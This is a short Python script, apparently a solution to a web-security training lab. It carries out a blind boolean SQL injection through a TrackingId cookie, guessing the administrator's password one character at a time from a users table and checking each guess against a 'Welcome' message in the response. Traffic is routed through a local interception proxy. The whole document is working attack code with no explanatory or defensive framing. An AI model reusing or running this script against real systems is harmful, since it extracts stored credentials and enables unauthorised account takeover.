import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

dictionary = 'zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP1234567890_-!@#$,.;:<>/'
haslo = ""
MyProxy = {'http':'http://127.0.0.1:8080/',
'https':'http://127.0.0.1:8080'}
r = requests.Session()
def brute():
    global haslo
    global dictionary
    while len(haslo)<20:
        for znak in dictionary:
            time.sleep(0.1)
            payload = f"IO9lAQHN2q2MUrJj' and (SELECT substring(password,{len(haslo)+1},1) FROM users WHERE username='administrator')='{znak}"
            r.cookies['TrackingId'] = payload
            r.cookies['session'] = '16CHEM3L2D3UCk9ocMfY2Xa1VfznBI4l'
            s = r.get('https://aders_URL', verify=False, proxies=MyProxy)
            if s.status_code != 200:
                print('Strona padla')
            else:
                if 'Welcome' in s.text:
                    haslo = haslo+znak
                    print(haslo)
                    break
    return haslo

brute()

print(f"Password is: {haslo}")
